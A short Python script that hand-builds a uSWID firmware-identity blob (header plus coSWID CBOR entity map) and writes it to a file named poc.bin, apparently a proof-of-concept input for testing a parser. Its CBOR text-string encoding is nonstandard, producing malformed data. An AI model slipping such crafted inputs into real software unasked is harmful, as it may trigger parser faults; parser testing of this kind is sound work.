import struct

# uSWID header
magic = bytes([0x53,0x42,0x4F,0x4D,0xD6,0xBA,0x2E,0xAC,0xA3,0xE6,0x7A,0x52,0xAA,0xEE,0x3B,0xAF])
hdrver = 0x01
hdrsz = 25  # 16+1+2+4+1+1
flags = 0x00
compression = 0x00

# Build coSWID CBOR payload
# Root map: {2: entity_map}
# entity_map: {31: "name", 32: "regid", 33: [1,2,3,4,5,6]}

def cbor_uint(n):
    if n < 24:
        return bytes([n])
    elif n < 256:
        return bytes([0x18, n])
    elif n < 65536:
        return bytes([0x19]) + struct.pack('>H', n)
    else:
        return bytes([0x1a]) + struct.pack('>I', n)

def cbor_text(s):
    b = s.encode()
    return cbor_uint(len(b)) + b

def cbor_array(items):
    return cbor_uint(0x80 | len(items)) + b''.join(items)

def cbor_map(pairs):
    return cbor_uint(0xa0 | len(pairs)) + b''.join(pairs)

# entity map
entity_map = cbor_map([
    cbor_uint(31) + cbor_text("name"),
    cbor_uint(32) + cbor_text("regid"),
    cbor_uint(33) + cbor_array([cbor_uint(1), cbor_uint(2), cbor_uint(3), cbor_uint(4), cbor_uint(5), cbor_uint(6)]),
])

# root map
root = cbor_map([
    cbor_uint(2) + entity_map,
])

payload = root
payloadsz = len(payload)

header = magic + bytes([hdrver]) + struct.pack('<H', hdrsz) + struct.pack('<I', payloadsz) + bytes([flags, compression])

poc = header + payload
with open('/workspace/poc.bin', 'wb') as f:
    f.write(poc)
print("payload len:", payloadsz)
print("total len:", len(poc))
print("header hex:", header.hex())
print("payload hex:", payload.hex())
EOF
